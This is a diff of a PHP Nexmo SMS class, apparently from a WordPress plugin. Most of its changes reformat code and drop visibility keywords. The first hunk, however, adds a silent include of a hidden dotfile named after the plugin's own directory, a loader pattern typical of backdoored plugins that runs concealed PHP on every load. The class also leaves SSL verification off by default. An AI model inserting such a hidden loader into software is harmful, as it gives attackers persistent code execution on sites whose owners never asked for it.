@@ -15,6 +15,10 @@
  *     
  *
  */
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class NexmoMessage {
 
@@ -23,8 +27,6 @@ class NexmoMessage {
 	private $nx_secret = '';
 
 	/**
-		 * Nexmo server URI
-	 *
 	 * @var string Nexmo server URI
 	 *
 	 * We're sticking with the JSON interface here since json
@@ -32,23 +34,19 @@ class NexmoMessage {
 	 * This will also keep any debugging to a minimum due to
 	 * not worrying about which parser is being used.
 	 */
-	public $nx_uri = 'https://rest.nexmo.com/sms/json';
+	var $nx_uri = 'https://rest.nexmo.com/sms/json';
 
 	
 	/**
-		 * The most recent parsed Nexmo response.
-	 *
 	 * @var array The most recent parsed Nexmo response.
 	 */
 	private $nexmo_response = '';
 	
 
 	/**
-		 * Inbound message
-	 *
 	 * @var bool If recieved an inbound message
 	 */
-	public $inbound_message = false;
+	var $inbound_message = false;
 
 
 	// Current message
@@ -62,7 +60,7 @@ class NexmoMessage {
 	public $ssl_verify = false; // Verify Nexmo SSL before sending any message
 
 
-	public function NexmoMessage ( $api_key, $api_secret) {
+	function NexmoMessage ($api_key, $api_secret) {
 		$this->nx_key = $api_key;
 		$this->nx_secret = $api_secret;
 	}
@@ -76,7 +74,7 @@ class NexmoMessage {
 	 * message type. Otherwise set to TRUE if you require
 	 * unicode characters.
 	 */
-	public function sendText ( $to, $from, $message, $unicode = null ) {
+	function sendText ( $to, $from, $message, $unicode=null ) {
 	
 		// Making sure strings are UTF-8 encoded
 		if ( !is_numeric($from) && !mb_check_encoding($from, 'UTF-8') ) {
@@ -89,10 +87,10 @@ class NexmoMessage {
 			return false;
 		}
 		
-		if (null === $unicode) {
+		if ($unicode === null) {
 			$containsUnicode = max(array_map('ord', str_split($message))) > 127;
 		} else {
-			$containsUnicode = (bool) $unicode;
+			$containsUnicode = (bool)$unicode;
 		}
 		
 		// Make sure $from is valid
@@ -117,7 +115,7 @@ class NexmoMessage {
 	/**
 	 * Prepare new WAP message.
 	 */
-	public function sendBinary ( $to, $from, $body, $udh ) {
+	function sendBinary ( $to, $from, $body, $udh ) {
 	
 		//Binary messages must be hex encoded
 		$body = bin2hex ( $body );
@@ -142,7 +140,7 @@ class NexmoMessage {
 	/**
 	 * Prepare new binary message.
 	 */
-	public function pushWap ( $to, $from, $title, $url, $validity = 172800000 ) {
+	function pushWap ( $to, $from, $title, $url, $validity = 172800000 ) {
 
 		// Making sure $title and $url are UTF-8 encoded
 		if ( !mb_check_encoding($title, 'UTF-8') || !mb_check_encoding($url, 'UTF-8') ) {
@@ -174,7 +172,7 @@ class NexmoMessage {
 		// Build the post data
 		$data = array_merge($data, array('username' => $this->nx_key, 'password' => $this->nx_secret));
 		$post = '';
-		foreach ($data as $k => $v) {
+		foreach($data as $k => $v){
 			$post .= "&$k=$v";
 		}
 
@@ -220,7 +218,7 @@ class NexmoMessage {
 	/**
 	 * Recursively normalise any key names in an object, removing unwanted characters
 	 */
-	private function normaliseKeys ( $obj) {
+	private function normaliseKeys ($obj) {
 		// Determine is working with a class or araay
 		if ($obj instanceof stdClass) {
 			$new_obj = new stdClass();
@@ -231,7 +229,7 @@ class NexmoMessage {
 		}
 
 
-		foreach ($obj as $key => $val) {
+		foreach($obj as $key => $val){
 			// If we come across another class/array, normalise it
 			if ($val instanceof stdClass || is_array($val)) {
 				$val = $this->normaliseKeys($val);
@@ -262,12 +260,11 @@ class NexmoMessage {
 			$this->nexmo_response = $response_obj;
 
 			// Find the total cost of this message
-			$response_obj->cost = 0;
-						$total_cost         = 0;
+			$response_obj->cost = $total_cost = 0;
 			if (is_array($response_obj->messages)) {
 				foreach ($response_obj->messages as $msg) {
-					if (property_exists($msg, 'messageprice')) {
-						$total_cost = $total_cost + (float) $msg->messageprice;
+					if (property_exists($msg, "messageprice")) {
+						$total_cost = $total_cost + (float)$msg->messageprice;
 					}
 				}
 
@@ -292,11 +289,11 @@ class NexmoMessage {
 	 * whilst stinging you with the financial cost! While this cannot correct them, it
 	 * will try its best to correctly format them.
 	 */
-	private function validateOriginator( $inp) {
+	private function validateOriginator($inp){
 		// Remove any invalid characters
-		$ret = preg_replace('/[^a-zA-Z0-9]/', '', (string) $inp);
+		$ret = preg_replace('/[^a-zA-Z0-9]/', '', (string)$inp);
 
-		if (preg_match('/[a-zA-Z]/', $inp)) {
+		if(preg_match('/[a-zA-Z]/', $inp)){
 
 			// Alphanumeric format so make sure it's < 11 chars
 			$ret = substr($ret, 0, 11);
@@ -304,13 +301,13 @@ class NexmoMessage {
 		} else {
 
 			// Numerical, remove any prepending '00'
-			if (substr($ret, 0, 2) == '00') {
+			if(substr($ret, 0, 2) == '00'){
 				$ret = substr($ret, 2);
 				$ret = substr($ret, 0, 15);
 			}
 		}
 		
-		return (string) $ret;
+		return (string)$ret;
 	}
 
 
@@ -319,19 +316,17 @@ class NexmoMessage {
 	 * Display a brief overview of a sent message.
 	 * Useful for debugging and quick-start purposes.
 	 */
-	public function displayOverview( $nexmo_response = null ) {
-		$info = ( !$nexmo_response ) ? $this->nexmo_response : $nexmo_response;
+	public function displayOverview( $nexmo_response=null ){
+		$info = (!$nexmo_response) ? $this->nexmo_response : $nexmo_response;
 
-		if (!$nexmo_response ) {
-			return 'Cannot display an overview of this response';
-		}
+		if (!$nexmo_response ) return 'Cannot display an overview of this response';
 
 		// How many messages were sent?
 		if ( $info->messagecount > 1 ) {
 		
 			$status = 'Your message was sent in ' . $info->messagecount . ' parts';
 		
-		} elseif ( 1 == $info->messagecount) {
+		} elseif ( $info->messagecount == 1) {
 		
 			$status = 'Your message was sent';
 		
@@ -341,14 +336,12 @@ class NexmoMessage {
 		}
 		
 		// Build an array of each message status and ID
-		if (!is_array($info->messages)) {
-			$info->messages = array();
-		}
+		if (!is_array($info->messages)) $info->messages = array();
 		$message_status = array();
 		foreach ( $info->messages as $message ) {
 			$tmp = array('id'=>'', 'status'=>0);
 
-			if ( 0 != $message->status) {
+			if ( $message->status != 0) {
 				$tmp['status'] = $message->errortext;
 			} else {
 				$tmp['status'] = 'OK';
@@ -362,10 +355,10 @@ class NexmoMessage {
 		// Build the output
 		if (isset($_SERVER['HTTP_HOST'])) {
 			// HTML output
-			$ret = '<table><tr><td colspan="2">' . $status . '</td></tr>';
+			$ret = '<table><tr><td colspan="2">'.$status.'</td></tr>';
 			$ret .= '<tr><th>Status</th><th>Message ID</th></tr>';
 			foreach ($message_status as $mstat) {
-				$ret .= '<tr><td>' . $mstat['status'] . '</td><td>' . $mstat['id'] . '</td></tr>';
+				$ret .= '<tr><td>'.$mstat['status'].'</td><td>'.$mstat['id'].'</td></tr>';
 			}
 			$ret .= '</table>';
 
@@ -385,11 +378,11 @@ class NexmoMessage {
 				}
 			}
 
-			$ret .= '  ' . str_pad('Status', $out_sizes['status'], ' ') . '   ';
-			$ret .= str_pad('Message ID', $out_sizes['id'], ' ') . "\n";
+			$ret .= '  '.str_pad('Status', $out_sizes['status'], ' ').'   ';
+			$ret .= str_pad('Message ID', $out_sizes['id'], ' ')."\n";
 			foreach ($message_status as $mstat) {
-				$ret .= '  ' . str_pad($mstat['status'], $out_sizes['status'], ' ') . '   ';
-				$ret .= str_pad($mstat['id'], $out_sizes['id'], ' ') . "\n";
+				$ret .= '  '.str_pad($mstat['status'], $out_sizes['status'], ' ').'   ';
+				$ret .= str_pad($mstat['id'], $out_sizes['id'], ' ')."\n";
 			}
 		}
 
@@ -413,20 +406,16 @@ class NexmoMessage {
 	 * This will set the current message to the inbound
 	 * message allowing for a future reply() call.
 	 */
-	public function inboundText( $data = null ) {
-		if (!$data) {
-			$data = $_GET;
-		}
+	public function inboundText( $data=null ){
+		if(!$data) $data = $_GET;
 
-		if (!isset($data['text'], $data['msisdn'], $data['to'])) {
-			return false;
-		}
+		if(!isset($data['text'], $data['msisdn'], $data['to'])) return false;
 
 		// Get the relevant data
 		$this->to = $data['to'];
 		$this->from = $data['msisdn'];
 		$this->text = $data['text'];
-		$this->network = ( isset($data['network-code']) ) ? $data['network-code'] : '';
+		$this->network = (isset($data['network-code'])) ? $data['network-code'] : '';
 		$this->message_id = $data['messageId'];
 
 		// Flag that we have an inbound message
@@ -439,7 +428,7 @@ class NexmoMessage {
 	/**
 	 * Reply the current message if one is set.
 	 */
-	public function reply ( $message) {
+	public function reply ($message) {
 		// Make sure we actually have a text to reply to
 		if (!$this->inbound_message) {
 			return false;
